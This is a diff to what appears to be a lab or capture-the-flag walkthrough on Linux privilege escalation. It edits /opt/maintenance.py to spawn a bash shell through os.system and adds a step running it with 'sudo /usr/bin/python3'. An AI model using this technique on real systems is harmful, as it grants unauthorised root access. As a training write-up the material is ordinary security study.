@@ -100,7 +100,7 @@ export TERM=xterm
 export SHELL=bash
 ```
 ```bash
-nano /opt/maintenance.txt
+nano /opt/maintenance.py
 ```
 ![image](https://github.com/user-attachments/assets/5b9a60c7-daa2-4800-99db-20d93413e729)
 ```bash
@@ -109,7 +109,11 @@ os.system("/usr/bin/python3 -c 'import os; os.system(\"/bin/bash\")'")
 ```
 ![image](https://github.com/user-attachments/assets/5e3d535d-468c-4247-acba-6564fae86b4b)
 
-
+## **We execute it:**
+```bash
+sudo /usr/bin/python3 /opt/maintenance.py
+```
+![image](https://github.com/user-attachments/assets/86397e0c-ea6d-468c-a8ba-b97806a23360)
 
 
 
